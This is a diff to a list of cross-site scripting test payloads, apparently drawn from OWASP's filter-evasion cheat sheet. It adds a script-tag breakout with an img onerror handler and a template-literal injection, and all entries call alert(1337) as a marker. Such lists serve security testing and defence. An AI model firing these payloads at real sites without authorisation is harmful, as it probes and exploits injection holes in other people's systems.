@@ -52,8 +52,10 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 <svg/ onload=alert(1337)//
 <Svg/OnLoad=(confirm)(1337)<!--
 <img src=x onerror=alert(1337)>
+</script><img src=x onerror=alert(1337)>
 <iframe src="javascript:alert(1337)">
 ';alert(1337)//
+${alert(1337)}
 <custom-tag onmouseover='alert(1337)'>
 /?x=y'%09onclick='alert(1337)'%09accessKey='x'
 /?'accesskey='x'onclick='alert(1337)
